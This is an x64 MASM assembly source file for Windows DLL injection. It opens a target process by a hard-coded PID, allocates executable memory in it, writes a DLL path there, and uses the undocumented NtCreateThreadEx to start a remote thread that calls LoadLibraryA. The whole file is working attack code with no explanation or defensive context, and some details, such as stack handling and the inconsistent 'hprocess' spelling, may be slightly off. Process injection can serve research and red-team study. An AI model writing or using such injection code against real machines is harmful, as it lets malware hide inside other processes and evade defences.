; windows_injection_ntcreatethreadex.asm

extrn ExitProcess :PROC
extrn OpenProcess :PROC
extrn VirtualAllocEx :PROC
extrn WriteProcessMemory :PROC
extrn GetModuleHandleA :PROC
extrn GetProcAddress :PROC

.data
    dllPath                 DB "C:\Users\User\Desktop\test.dll", 0
    sKrnl32                 DB "kernel32.dll", 0
    sNtdll                  DB "ntdll.dll", 0
    sLoadLib                DB "LoadLibraryA", 0
    sNtCreateThreadEx       DB "NtCreateThreadEx", 0
    PID                     DQ 7844

    hProcess                DQ ?
    nSizeDLL                DQ ?
    baseAddr                DQ ?
    hKrnl32Addr             DQ ?
    hLoadLibAddr            DQ ?
    hNtCreateThreadExAddr   DQ ?
    hNtdllAddr              DQ ?
    hThread                 DQ ?

.code

Start PROC
    SUB     rsp, 28h

    ; OpenProcess()
    MOV     rcx, 1F0FFFh
    XOR     rdx, rdx
    MOV     r8, PID
    CALL    OpenProcess
    CMP     rax, 0
    JZ      _exit
    MOV     hProcess, rax

    ; VirtualAllocEx()
    SUB     rsp, 28h
    MOV     rcx, hProcess
    XOR     rdx, rdx
    MOV     r8, SIZEOF dllPath
    MOV     r9, 3000h
    MOV     qword ptr [rsp+32], 40h
    CALL    VirtualAllocEx
    ADD     rsp, 28h
    CMP     rax, 0
    JZ      _exit
    MOV     [baseAddr], rax

    ; WriteProcessMemory()
    SUB     rsp, 28h
    MOV     rcx, hProcess
    MOV     rdx, baseAddr
    LEA     r8, dllPath
    MOV     r9, SIZEOF dllPath
    XOR     rax, rax
    MOV     qword ptr [rsp+32], rax
    CALL    WriteProcessMemory
    ADD     rsp, 28h
    CMP     rax, 0
    JZ      _exit

    ; GetModuleHandle()
    LEA     rcx, sKrnl32
    CALL    GetModuleHandleA
    CMP     rax, 0
    JZ      _exit
    MOV     hKrnl32Addr, rax

    ; GetProcAddress()
    MOV     rcx, hKrnl32Addr
    LEA     rdx, sLoadLib
    CALL    GetProcAddress
    CMP     rax, 0
    JZ      _exit
    MOV     hLoadLibAddr, rax

    ; GetModuleHandle()
    LEA     rcx, sNtdll
    CALL    GetModuleHandleA
    CMP     rax, 0
    JZ      _exit
    MOV     hNtdllAddr, rax

    ; GetProcAddress() -> NtCreateThreadEx
    MOV     rcx, hNtdllAddr
    LEA     rdx, sNtCreateThreadEx
    CALL    GetProcAddress
    CMP     rax, 0
    JZ      _exit
    MOV     hNtCreateThreadExAddr, rax

    ; NtCreateThreadEx()
    SUB     rsp, 58h
    LEA     rcx, hThread
    MOV     rdx, 1FFFFFh
    XOR     r8, r8
    MOV     r9, hprocess
    XOR     rax, rax
    MOV     qword ptr [rsp+50h], rax
    MOV     qword ptr [rsp+48h], rax
    MOV     qword ptr [rsp+40h], rax
    MOV     qword ptr [rsp+38h], rax
    MOV     qword ptr [rsp+30h], rax
    MOV     rax, baseAddr
    MOV     qword ptr [rsp+28h], rax
    MOV     rax, hLoadLibAddr
    MOV     qword ptr [rsp+20h], rax
    MOV     rax, hNtCreateThreadExAddr
    CALL    rax
    ADD     rsp, 58h

_exit:
    XOR     rcx, rcx
    CALL    ExitProcess
Start ENDP

END